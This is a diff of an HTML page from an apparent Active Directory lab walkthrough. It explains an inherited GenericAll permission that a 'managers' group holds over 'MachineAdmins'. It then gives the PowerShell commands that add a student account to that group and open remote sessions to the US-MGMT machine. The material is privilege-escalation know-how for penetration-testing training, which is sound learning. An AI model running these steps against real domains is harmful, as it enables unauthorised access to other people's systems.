-<p>**(CN=MachineAdmins,OU=Mgmt,DC=us,DC=techcorp,DC=local) Group ACL**</p>
-<li>**ObjectDN**: `CN=MachineAdmins,OU=Mgmt,DC=us,DC=techcorp,DC=local` → The Distinguished Name of the `MachineAdmins` group in the `Mgmt` OU within the `us.techcorp.local` domain.</li>
-<li>**AceQualifier**: `AccessAllowed` → The permissions are explicitly allowed for the specified group.</li>
-<li>**ActiveDirectoryRights**: `GenericAll` → Grants full control over the object, including read, write, delete, and manage permissions.</li>
-<li>**ObjectAceType**: `All` → The permission applies to all attributes of the object.</li>
-<li>**AceFlags**: `ContainerInherit, Inherited` → The permissions apply to all child objects within the container and are inherited from a parent object.</li>
-<li>**AceType**: `AccessAllowedObject` → The permissions allow access rather than denying it.</li>
-<li>**InheritanceFlags**: `ContainerInherit` → The permissions propagate to child objects in the container.</li>
-<li>**SecurityIdentifier (SID)**: `S-1-5-21-210670787-2521448726-163245708-1117` → The unique identifier of the `managers` group granted permissions.</li>
-<li>**IdentityReferenceName**: `managers` → The group that has been granted the permissions.</li>
-<li>**IdentityReferenceDomain**: `us.techcorp.local` → The domain where the `managers` group resides.</li>
-<li>**IdentityReferenceDN**: `CN=Managers,CN=Users,DC=us,DC=techcorp,DC=local` → The Distinguished Name of the `managers` group.</li>
-<li>**IdentityReferenceClass**: `group` → Specifies that the permissions are assigned to a group.</li>
-<p>The `managers` group in the `us.techcorp.local` domain has been granted **full control** (`GenericAll`) over the `MachineAdmins` group located in the `Mgmt` Organizational Unit.</p>
-<p>This means the `managers` group can **read, write, delete, and manage all attributes** of the `MachineAdmins` group.</p>
+<p><strong>(CN=MachineAdmins,OU=Mgmt,DC=us,DC=techcorp,DC=local) Group ACL</strong></p>
+<ul>
+<li><strong>ObjectDN</strong>: <code>CN=MachineAdmins,OU=Mgmt,DC=us,DC=techcorp,DC=local</code> → The Distinguished Name of the <code>MachineAdmins</code> group in the <code>Mgmt</code> OU within the <code>us.techcorp.local</code> domain.</li>
+<li><strong>AceQualifier</strong>: <code>AccessAllowed</code> → The permissions are explicitly allowed for the specified group.</li>
+<li><strong>ActiveDirectoryRights</strong>: <code>GenericAll</code> → Grants full control over the object, including read, write, delete, and manage permissions.</li>
+<li><strong>ObjectAceType</strong>: <code>All</code> → The permission applies to all attributes of the object.</li>
+<li><strong>AceFlags</strong>: <code>ContainerInherit, Inherited</code> → The permissions apply to all child objects within the container and are inherited from a parent object.</li>
+<li><strong>AceType</strong>: <code>AccessAllowedObject</code> → The permissions allow access rather than denying it.</li>
+<li><strong>InheritanceFlags</strong>: <code>ContainerInherit</code> → The permissions propagate to child objects in the container.</li>
+<li><strong>SecurityIdentifier (SID)</strong>: <code>S-1-5-21-210670787-2521448726-163245708-1117</code> → The unique identifier of the <code>managers</code> group granted permissions.</li>
+<li><strong>IdentityReferenceName</strong>: <code>managers</code> → The group that has been granted the permissions.</li>
+<li><strong>IdentityReferenceDomain</strong>: <code>us.techcorp.local</code> → The domain where the <code>managers</code> group resides.</li>
+<li><strong>IdentityReferenceDN</strong>: <code>CN=Managers,CN=Users,DC=us,DC=techcorp,DC=local</code> → The Distinguished Name of the <code>managers</code> group.</li>
+<li><strong>IdentityReferenceClass</strong>: <code>group</code> → Specifies that the permissions are assigned to a group.</li>
+</ul>
+<p>The <code>managers</code> group in the <code>us.techcorp.local</code> domain has been granted <strong>full control</strong> (<code>GenericAll</code>) over the <code>MachineAdmins</code> group located in the <code>Mgmt</code> Organizational Unit.</p>
+<p>This means the <code>managers</code> group can <strong>read, write, delete, and manage all attributes</strong> of the <code>MachineAdmins</code> group.</p>
 <p>The permissions are:</p>
-<li>**Explicitly allowed** (`AccessAllowed`) and apply to **all attributes** (`ObjectAceType: All`) of the object.</li>
-<li>**Inherited** (`Inherited`) from a parent object and propagate to **child objects** (`ContainerInherit`).</li>
-<p>With **GenericAll** permissions, the `managers` group has full administrative control over `MachineAdmins`, allowing them to:</p>
-<li>Add or remove users from the `MachineAdmins` group.</li>
+<ul>
+<li><strong>Explicitly allowed</strong> (<code>AccessAllowed</code>) and apply to <strong>all attributes</strong> (<code>ObjectAceType: All</code>) of the object.</li>
+<li><strong>Inherited</strong> (<code>Inherited</code>) from a parent object and propagate to <strong>child objects</strong> (<code>ContainerInherit</code>).</li>
+</ul>
+<p>With <strong>GenericAll</strong> permissions, the <code>managers</code> group has full administrative control over <code>MachineAdmins</code>, allowing them to:</p>
+<ul>
+<li>Add or remove users from the <code>MachineAdmins</code> group.</li>
 <li>Modify group attributes.</li>
 <li>Potentially escalate privileges or abuse group memberships for further exploitation.</li>
-<p>This configuration could represent a **privilege escalation risk** if the `managers` group is compromised, as it allows complete control over the `MachineAdmins` group.</p>
-<p>We can now quickly enumerate ACEs from `MachineAdmins` group using `Get-DomainsObjectACL` from PowerView.</p>
-<p>This command enumerates **ACLs for a specific object**, in this case, the `machineadmins` group, and filters for entries where the `managers` group has permissions.</p>
-<p>`Get-DomainObjectAcl -Identity 'machineadmins' -ResolveGUIDs | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match 'managers'}`</p>
+</ul>
+<p>This configuration could represent a <strong>privilege escalation risk</strong> if the <code>managers</code> group is compromised, as it allows complete control over the <code>MachineAdmins</code> group.</p>
+<p>We can now quickly enumerate ACEs from <code>MachineAdmins</code> group using <code>Get-DomainsObjectACL</code> from PowerView.</p>
+<p>This command enumerates <strong>ACLs for a specific object</strong>, in this case, the <code>machineadmins</code> group, and filters for entries where the <code>managers</code> group has permissions.</p>
+<p><code>Get-DomainObjectAcl -Identity 'machineadmins' -ResolveGUIDs | ForEach-Object {$<em> | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $</em>.SecurityIdentifier);$<em>} | ?{$</em>.IdentityName -match 'managers'}</code></p>
 <pre><code class="language-powershell">  AceQualifier           : AccessAllowed
 ObjectDN               : CN=MachineAdmins,OU=Mgmt,DC=us,DC=techcorp,DC=local
 ActiveDirectoryRights  : ReadProperty, WriteProperty
@@ -593,39 +639,38 @@ AceFlags               : ContainerInherit, Inherited
 InheritedObjectAceType : Group
 OpaqueLength           : 0
 IdentityName           : US\managers</code></pre>
-<p>To quickly summarize, our `studentuser163` through group membership of `Managers` group has `GenericAll` rights on `machineadmins` group.</p>
-<p>We can also check the ‘`MachineAdmins`’  Description the following message: `Group to manage machines of the Mgmt OU`.</p>
-<img src="./images/screenshot_49.png" alt="image" class="content-image">
-<p>So basically this group is managing all the Administrator machines inside `Mgmt` Organization Unit.</p>
+<p>To quickly summarize, our <code>studentuser163</code> through group membership of <code>Managers</code> group has <code>GenericAll</code> rights on <code>machineadmins</code> group.</p>
+<p>We can also check the ‘<code>MachineAdmins</code>’  Description the following message: <code>Group to manage machines of the Mgmt OU</code>.</p>
+<img src="./images/screenshot_49.png" alt="image">
+<p>So basically this group is managing all the Administrator machines inside <code>Mgmt</code> Organization Unit.</p>
 <p>Ok so let’s move on.</p>
 <h3>GenericAll Abuse Over Group with ADModule</h3>
-<p>Since we are member of group manager, and group manager has `GenericAll` over `MachineAdmins` from `Mgtm` OU, we can simply add our user `studentuser163` into `MachineAdmins` group. To accomplish this task we can simply use the following command from ADModule.</p>
-<p>`Add-ADGroupMember -Identity 'MachineAdmins' -Members 'studentuser163' -Verbose`</p>
-<img src="./images/screenshot_50.png" alt="image" class="content-image">
-<p>We can see above that we were able to add our user studentuser163 inside `MachineAdmins` group.</p>
-<p>Let’s enumerate this group and confirm that we are now member of `MachineAdmins` group.</p>
-<p>`Get-ADGroupMember -Identity 'MachineAdmins'`</p>
-<img src="./images/screenshot_51.png" alt="image" class="content-image">
-<p>Now that we are part of `MachineAdmins`, remember previously when we were enumerating OUs we had a machine named US-MGTM inside MGTM OU.</p>
+<p>Since we are member of group manager, and group manager has <code>GenericAll</code> over <code>MachineAdmins</code> from <code>Mgtm</code> OU, we can simply add our user <code>studentuser163</code> into <code>MachineAdmins</code> group. To accomplish this task we can simply use the following command from ADModule.</p>
+<p><code>Add-ADGroupMember -Identity 'MachineAdmins' -Members 'studentuser163' -Verbose</code></p>
+<img src="./images/screenshot_50.png" alt="image">
+<p>We can see above that we were able to add our user studentuser163 inside <code>MachineAdmins</code> group.</p>
+<p>Let’s enumerate this group and confirm that we are now member of <code>MachineAdmins</code> group.</p>
+<p><code>Get-ADGroupMember -Identity 'MachineAdmins'</code></p>
+<img src="./images/screenshot_51.png" alt="image">
+<p>Now that we are part of <code>MachineAdmins</code>, remember previously when we were enumerating OUs we had a machine named US-MGTM inside MGTM OU.</p>
 <p>We can also enumerate it again with the following command:</p>
-<p>`Get-ADOrganizationalUnit -Identity 'OU=Mgmt,DC=us,DC=techcorp,DC=local' | %{Get-ADComputer -SearchBase $_ -Filter *} | Select name`</p>
-<img src="./images/screenshot_52.png" alt="image" class="content-image">
-<p>The machine `US-MGMT` is part of OU `MGMT` and we are part of `MachineAdmins` which is a group inside `MGMT` OU. We should have access to this machine with `studentuser163`.</p>
+<p><code>Get-ADOrganizationalUnit -Identity 'OU=Mgmt,DC=us,DC=techcorp,DC=local' | %{Get-ADComputer -SearchBase $_ -Filter *} | Select name</code></p>
+<img src="./images/screenshot_52.png" alt="image">
+<p>The machine <code>US-MGMT</code> is part of OU <code>MGMT</code> and we are part of <code>MachineAdmins</code> which is a group inside <code>MGMT</code> OU. We should have access to this machine with <code>studentuser163</code>.</p>
 <p>Note that we need to clear our existing TGT so that the new group membership isassigned in the new TGT.  So, a logoff and logon may be required.</p>
-<p>After logoff/login again we can see that we are now part of `US\machineadmins` group and we can use winrs for accessing machine us-mgmt.</p>
-<img src="./images/screenshot_53.png" alt="image" class="content-image">
+<p>After logoff/login again we can see that we are now part of <code>US\machineadmins</code> group and we can use winrs for accessing machine us-mgmt.</p>
+<img src="./images/screenshot_53.png" alt="image">
 <h3>Remote accessing US-MGMT with WinRS</h3>
-<p>`winrs -r:us-mgmt cmd`</p>
-<img src="./images/screenshot_54.png" alt="image" class="content-image">
-<p>As we can see above, we were able to access the `US-MGMT` machine with user `studentuser163`.</p>
+<p><code>winrs -r:us-mgmt cmd</code></p>
+<img src="./images/screenshot_54.png" alt="image">
+<p>As we can see above, we were able to access the <code>US-MGMT</code> machine with user <code>studentuser163</code>.</p>
 <h3>Remote accessing US-MGMT  PowerShell Remoting</h3>
-<p>`$usmgmt = New-PSSession us-mgmt`</p>
-<p>`Enter-PSSession $usmgmt`</p>
-<img src="./images/screenshot_55.png" alt="image" class="content-image">
-          <div class="navigation">
+<p><code>$usmgmt = New-PSSession us-mgmt</code></p>
+<p><code>Enter-PSSession $usmgmt</code></p>
+<img src="./images/screenshot_55.png" alt="image">
+          <div class="part-navigation">
             <a href="part-02-enumeration.html"><ion-icon name="arrow-back-outline"></ion-icon> Previous: Enumeration</a>
-            <a href="index.html">Index</a>
-            <a href="part-04-kerberoasting-attack.html">Next: Kerberoasting Attack <ion-icon name="arrow-forward-outline"></ion-icon></a>
+            <a href="part-04-kerberoasting-attack.html">Next: Kerberoasting attack <ion-icon name="arrow-forward-outline"></ion-icon></a>
           </div>
         </div>
       </article>
